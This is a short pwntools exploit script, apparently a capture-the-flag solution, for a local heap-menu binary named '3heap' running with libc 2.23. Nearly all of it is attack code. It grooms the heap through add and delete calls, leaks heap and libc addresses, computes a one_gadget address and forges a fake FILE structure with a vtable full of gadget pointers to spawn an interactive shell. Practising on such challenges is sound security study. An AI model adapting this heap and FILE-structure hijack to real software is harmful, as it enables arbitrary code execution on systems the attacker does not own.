from pwn import *
p=process('./3heap',env={'LD_PRELOAD':'./libc-2.23.so'})
def addhomura(data):
	p.recvuntil('choice')
	p.sendline('1')
	p.recvuntil('choice')
	p.sendline('1')
	p.recvuntil('content')
	p.send(data)

def delehomura():
	p.recvuntil('choice')
	p.sendline('1')
	p.recvuntil('choice')
	p.sendline('2')

def addcoss(data):
	p.recvuntil('choice')
	p.sendline('2')
	p.recvuntil('choice')
	p.sendline('1')
	p.recvuntil('content')
	p.send(data)


def delecoss():
	p.recvuntil('choice')
	p.sendline('2')
	p.recvuntil('choice')
	p.sendline('2')

def addmo(data):
	p.recvuntil('choice')
	p.sendline('3')
	p.recvuntil('choice')
	p.sendline('1')
	p.recvuntil('content')
	p.send(data)
def delemo():
	p.recvuntil('choice')
	p.sendline('3')
	p.recvuntil('choice')
	p.sendline('2')


def readfile():
	p.recvuntil('choice')
	p.sendline('4')
	p.sendline('aaaa')


addhomura('aaa\n')#1
addcoss('aaa\n')
addmo('aaa\n')
delecoss()
delehomura()#0
addhomura('a'*0x208)

addhomura('\n')#2
readfile()
delehomura()#1
delemo()

delehomura()#0
addhomura('\n')#1

p.recvuntil('choice')
p.sendline('1')
p.recvuntil('choice:\n')
p.sendline('3')
heap = u64(p.recv(6).ljust(8,'\x00'))
info(hex(heap))
delehomura()#0
addhomura('aaaaaaaa\n')#1
p.recvuntil('choice')
p.sendline('1')
p.recvuntil('choice')
p.sendline('3')
p.recvuntil('a'*8)
addr = u64(p.recv(6).ljust(8,'\x00'))
libc_addr = addr - (0x00007fca72624b78-0x7fca72260000)
one = libc_addr + 0xf1147
info(hex(libc_addr))
table = p64(0)*2+p64(one)*19
fake = p64(libc_addr +(0x00007f59fbad2488-0x7f59a4135000))
fake+= 3*p64(0)
fake+=p64(heap)
fake+=p64(heap+0x10)
fake+=p64(0)*7
fake+= p64(libc_addr +(0x00007f59a44fa540 - 0x7f59a4135000))
fake +=p64(3)
fake +=2*p64(0)
fake +=p64(heap - 0x140)
fake +=p64(0xffffffffffffffff)
fake +=p64(0)
fake +=p64(heap - 0x130)
fake +=p64(0)*4
fake += p64(0x00000000ffffffff) 
fake += p64(0)
fake +=p64(heap -0x430)
delehomura()#0
addhomura(table+'\n')#1
addhomura(fake+'\n')#2
p.sendline('5')
p.sendline('a')
p.interactive()

